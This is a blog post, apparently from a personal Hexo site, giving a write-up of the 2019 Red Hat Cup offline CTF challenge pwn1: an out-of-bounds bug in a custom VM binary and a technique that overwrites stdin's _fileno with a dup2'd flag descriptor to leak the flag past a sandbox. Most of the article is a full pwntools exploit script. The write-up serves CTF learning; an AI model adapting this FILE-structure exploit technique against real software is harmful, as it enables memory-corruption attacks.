@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>红帽杯线下pwn1遇到IO_File新利用方法 | DaJun的Blog | 我想变成大牛，很大的那种</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="pwn">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":true,"app_id":"ekgad1tINypClpAa8y0wrbvl-gzGzoHsz","app_key":"Qn93YchF3LXlS54tbXjzMvAI","icon":true}'),
+            v: JSON.parse('{"enable":true,"appid":"ekgad1tINypClpAa8y0wrbvl-gzGzoHsz","appkey":"Qn93YchF3LXlS54tbXjzMvAI","notify":true,"verify":true,"placeholder":"想说什么...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/girl.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">DaJun</h5>
+          <a href="mailto:571986260@qq.com" title="571986260@qq.com" class="mail">
+            
+              <span>5</span>
+            
+              <span>7</span>
+            
+              <span>1</span>
+            
+              <span>9</span>
+            
+              <span>8</span>
+            
+              <span>6</span>
+            
+              <span>2</span>
+            
+              <span>6</span>
+            
+              <span>0</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                ABOUT
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://github.com/DayJun" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>红帽杯线下pwn1遇到IO_File新利用方法</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/dawn.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">红帽杯线下pwn1遇到IO_File新利用方法</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-11-29T07:09:38.000Z" itemprop="datePublished" class="page-time">
+  2019-11-29
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/writeup/">writeup</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-红帽杯线下pwn1"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">红帽杯线下pwn1遇到IO_File新利用方法</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-11-29 15:09:38" datetime="2019-11-29T07:09:38.000Z"  itemprop="datePublished">2019-11-29</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/writeup/">writeup</a></li></ul>
+
+
+
+            
+	<span id="/2019/11/29/红帽杯线下pwn1/" class="leancloud_visitors" data-flag-title="红帽杯线下pwn1遇到IO_File新利用方法" title="红帽杯线下pwn1遇到IO_File新利用方法">
+		
+			<i class="icon icon-eye"></i>
+		
+		<span class="leancloud-visitors-count"></span>
+	</span>
+ 
+
+            
+    <span class="leancloud-comment">
+        <i class="icon icon-comment-o"></i>
+        <a href="/2019/11/29/红帽杯线下pwn1/#comment">
+            <span class="valine-comment-count" data-xid="/2019/11/29/红帽杯线下pwn1/"></span>
+        </a>
+    </span>
+
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <p>修改<code>_fileno</code>来让<code>stdin</code>从<code>fd</code>中读数据</p>
+<p>文件都在：<a href="[https://github.com/DayJun/Blogs/tree/master/Articles/2019-%E7%BA%A2%E5%B8%BD%E6%9D%AF-%E7%B2%A4%E6%B5%B7%E4%B8%AD%E5%BF%83-pwn1](https://github.com/DayJun/Blogs/tree/master/Articles/2019-红帽杯-粤海中心-pwn1)">Github</a></p>
+<h1 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h1><p>最开始它获取了flag文件的文件描述符，并把它用<code>dup2</code>映射到0x233，这样我们就知道0x233是flag的文件描述符</p>
+<p>然后定义了沙盒规则，不允许<code>execve</code>和<code>write</code>，且虚拟机本身只能输入0x40道指令</p>
+<h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h1><p>它在处理指令的时候，有使用寄存器中的值作为index来存取它定的内存区的数据的操作，但是它却没有对寄存器进行检查</p>
+<p>如果寄存器中是负数，那它就可以存取到内存区之外的数据，导致OOB</p>
+<h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><ol>
+<li>读取到<code>_IO_2_1_stdin_</code>的地址</li>
+<li>将它加0x6c（即定位到它-4的位置)</li>
+<li>将栈地址覆盖成前两步修改后的地址</li>
+<li>用<code>push</code>操作把0x233写到<code>_IO_2_1_stdin_</code>的<code>_fileno</code></li>
+<li>最后的<code>scanf</code>后的<code>printf</code>就会把flag打印出来</li>
+</ol>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">it = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">success = <span class="keyword">lambda</span> x, y:log.success(x + <span class="string">' '</span>+ hex(y))</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./RHVM.bin'</span></span><br><span class="line">io = process(binary)</span><br><span class="line">o = &#123;<span class="string">"give"</span>:<span class="number">0x40</span>, <span class="string">"print"</span>:<span class="number">0x60</span>, <span class="string">"sub"</span>:<span class="number">208</span>, <span class="string">'memb'</span>:<span class="number">0x42</span>&#125;</span><br><span class="line">ops = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(a, b, c)</span>:</span></span><br><span class="line">    ops.append((a &lt;&lt; <span class="number">16</span>) + (b &lt;&lt; <span class="number">8</span>) + c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">moveBtoRA</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    add(<span class="number">0x40</span>, a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printS</span><span class="params">()</span>:</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RAsubRB</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    add(<span class="number">208</span>, a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RARdengyuRBM</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    add(<span class="number">0x42</span>, a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RAMdengyuRBR</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    add(<span class="number">0x41</span>, a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RAmulRB</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    add(<span class="number">0xc0</span>, a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RAzuoyiRB</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    add(<span class="number">224</span>, a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RAaddRB</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    add(<span class="number">160</span>, a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pushRA</span><span class="params">(a)</span>:</span></span><br><span class="line">    add(<span class="number">0x70</span>, <span class="number">0</span>, a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">moveBtoRA(<span class="number">0</span>, <span class="number">6</span>)</span><br><span class="line">moveBtoRA(<span class="number">1</span>, <span class="number">4</span>)</span><br><span class="line">RAaddRB(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">RAsubRB(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">moveBtoRA(<span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line">RAmulRB(<span class="number">3</span>, <span class="number">1</span>)</span><br><span class="line">RAsubRB(<span class="number">4</span>, <span class="number">3</span>)</span><br><span class="line">RARdengyuRBM(<span class="number">5</span>, <span class="number">4</span>)</span><br><span class="line">moveBtoRA(<span class="number">5</span>, <span class="number">6</span>)</span><br><span class="line">RAzuoyiRB(<span class="number">5</span>, <span class="number">1</span>)</span><br><span class="line">moveBtoRA(<span class="number">7</span>, <span class="number">8</span>)</span><br><span class="line">RAaddRB(<span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line">RAaddRB(<span class="number">0</span>, <span class="number">7</span>)</span><br><span class="line">RAaddRB(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">RAMdengyuRBR(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">moveBtoRA(<span class="number">3</span>, <span class="number">1</span>)</span><br><span class="line">RAaddRB(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">RAaddRB(<span class="number">4</span>, <span class="number">3</span>)</span><br><span class="line">RARdengyuRBM(<span class="number">6</span>, <span class="number">4</span>)</span><br><span class="line">RAMdengyuRBR(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">moveBtoRA(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">moveBtoRA(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">RAzuoyiRB(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">RAaddRB(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">RAzuoyiRB(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">RAaddRB(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">pushRA(<span class="number">0</span>)</span><br><span class="line">printS()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(binary)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'EIP: '</span>)</span><br><span class="line">sl(<span class="string">'0'</span>)</span><br><span class="line">ru(<span class="string">'ESP: '</span>)</span><br><span class="line">sl(<span class="string">'0'</span>)</span><br><span class="line">ru(<span class="string">'Give me code length: '</span>)</span><br><span class="line">sl(str(len(ops)))</span><br><span class="line">ru(<span class="string">'Give me code: '</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ops:</span><br><span class="line">    sl(str(i))</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要是利用方法对我来说比较新颖，特此记录一下</p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-11-29T07:28:07.349Z" itemprop="dateUpdated">2019-11-29 15:28:07</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2019/11/29/红帽杯线下pwn1/" target="_blank" rel="external">http://dayjun.top/2019/11/29/红帽杯线下pwn1/</a>
+        
+    </div>
+    <footer>
+        <a href="http://dayjun.top">
+            <img src="/img/girl.jpg" alt="DaJun">
+            DaJun
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://dayjun.top/2019/11/29/红帽杯线下pwn1/&title=《红帽杯线下pwn1遇到IO_File新利用方法》 — DaJun的Blog&pic=http://dayjun.top/img/girl.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://dayjun.top/2019/11/29/红帽杯线下pwn1/&title=《红帽杯线下pwn1遇到IO_File新利用方法》 — DaJun的Blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+    <div id="comment"></div>
+
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2019/11/18/关于patch-elf文件的一些思考/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">关于patch elf文件的一些思考</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#概览"><span class="post-toc-number">1.</span> <span class="post-toc-text">概览</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞点"><span class="post-toc-number">2.</span> <span class="post-toc-text">漏洞点</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#利用方法"><span class="post-toc-number">3.</span> <span class="post-toc-text">利用方法</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#exp"><span class="post-toc-number">4.</span> <span class="post-toc-text">exp</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#总结"><span class="post-toc-number">5.</span> <span class="post-toc-text">总结</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        我们一起来让这个世界有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.png" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="https://3nd.xyz/" target="_blank">3ND</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://blog.douluodalu.wang/" target="_blank">PwmHt</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                DaJun &copy; 2019
+            </span>
+        		
+           	
+           	<span>
+           		<a href="http://www.miitbeian.gov.cn/" target="_blank">苏ICP备19059861号</a>
+           	</span>
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://dayjun.top/2019/11/29/红帽杯线下pwn1/&title=《红帽杯线下pwn1遇到IO_File新利用方法》 — DaJun的Blog&pic=http://dayjun.top/img/girl.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://dayjun.top/2019/11/29/红帽杯线下pwn1/&title=《红帽杯线下pwn1遇到IO_File新利用方法》 — DaJun的Blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACJ0lEQVR42u3aQY7DIAwF0N7/0pntSJ3Qb0xHCjxWVZVSvywsY/N6xev6td6/f3/m7vu7X93tuXhhYGA8lnEN1zjE8T550OPnx7FhYGCcw7gLK0mCc6GMn8xjw8DAwKgmyk7ixsDAwFjFKGxdDBEDAwNjzMgLuGTTucQ6l8QxMDBOYORd9////JX5BgYGxqMYV3F12HmRV44KAwNja0ae4PJQcvzcYfg2HgwMjK0Z/fTXYeeH28lKFgMD4+GMpCnWeivB68gBtwddDAyMrRnjEKvjgeTP8v8qDyQwMDA2ZcwVdnkCTcaT1cHAH09iYGBszageIL+RcOcaeYU+HAYGxnaMvB22tgGXv9YPhSMGBsZ2jGoLrDq2zK/GdnbDwMDYm5EXfN+4YJGMIgqJGwMDY1NGXtJVP+dJNknxH77BwMA4gLHqqkTSIOsMCW6jxcDA2JqRNLZWHWvz4PICEQMD4xzGqqNsdSxabfBF5SwGBsamjLkLFnPDy+rVjcmuIQYGxtaMvMmVFHzj9tmqF4SBgXEOo9oUq7bPOkVkdMTFwMA4gJEn3FY7rNhWKyRiDAyMTRlXcVWHmp1hQGEHDAyMrRmdJle1iTZ35QsDAwMjSbtzW0++rU7CxcDAOICRHzKTyxNJmZi0/hePMDEwMI5hrCoo+w07DAwMjGqzrDx0DH6bp3UMDIwTGHl5Vw26GmJrEouBgbEpo1N3zRWU1aFCPyoMDIzHMn4A9Gnk885uM5AAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+        <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script type="text/javascript" src="/js/plugins/valine.js?v=1.4.4"></script>
+    
+    
+
+
+
+<script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.4.4"></script>
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+    <script>
+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '(～﹃～)~zZ';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(￣▽￣)';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+
+
+
+
+
+    
+</body>
+</html>
